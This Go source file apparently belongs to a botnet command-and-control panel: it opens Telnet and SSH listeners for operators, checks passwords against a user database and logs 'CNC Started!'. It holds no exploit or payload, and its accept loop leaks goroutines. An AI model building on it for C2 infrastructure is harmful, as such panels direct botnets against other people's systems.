package net

import (
	"api/core/database"
	"api/core/models"
	"api/core/models/log"
	"fmt"
	"io/ioutil"
	"net"

	"github.com/gliderlabs/ssh"
	"github.com/matthewhartstonge/argon2"
	gossh "golang.org/x/crypto/ssh"
)

var (
	argon argon2.Config
)

func Listener() {
	// Configure your desired ports here
	listenAddr := fmt.Sprintf("0.0.0.0:%s", models.Config.Server.Telnet) // Telnet port
	sshListenAddr := fmt.Sprintf("0.0.0.0:%s", models.Config.Server.SSH) // SSH port

	// Set up TCP listener for both SSH and Telnet
	tcpListener, err := net.Listen("tcp4", listenAddr)
	if err != nil {
		log.Fatalf("[NET] Failed to listen on Telnet %s: %v", listenAddr, err)
	}
	defer tcpListener.Close()

	argon = argon2.DefaultConfig()

	// SSH server configuration
	sshConfig := &ssh.Server{
		Addr:            ":" + models.Config.Server.SSH,
		Handler:         sessionHandler,
		PasswordHandler: passwordHandler,
	}
	keyParser("assets/cert/key.cat", sshConfig) //fix

	// Start SSH server in a separate goroutine
	go func() {
		err := sshConfig.ListenAndServe()
		if err != nil {
			log.Fatal("[SSH] Server failed: ", err)
		}
	}()

	log.Printf("CNC Started! | Telnet: %s | SSH: %s", listenAddr, sshListenAddr)

	// Accept incoming connections for Telnet as well
	for {
		select {
		case telnetConn := <-accept(tcpListener):
			log.Printf("New Telnet connection from: %s", telnetConn.RemoteAddr())
			handler(telnetConn)
		}
	}
}

func keyParser(file string, srv *ssh.Server) {
	pemBytes, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	hostKey, err := gossh.ParsePrivateKey(pemBytes)
	if err != nil {
		fmt.Println(err)
		return
	}
	srv.AddHostKey(hostKey)
}

func sessionHandler(session ssh.Session) {
	NewAdmin(session).Handle()
}
func passwordHandler(ctx ssh.Context, pass string) bool {
	passwd := []byte(pass)
	user, err := database.Container.GetUser(ctx.User())
	if err != nil {
		log.Println(err)
		return false
	} else if !user.IsKey(passwd) {
		return false
	}
	return true
}

// accept accepts incoming connections on the listener
func accept(listener net.Listener) chan net.Conn {
	ch := make(chan net.Conn)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Failed to accept incoming connection: %v", err)
				continue
			}
			ch <- conn
		}
	}()
	return ch
}
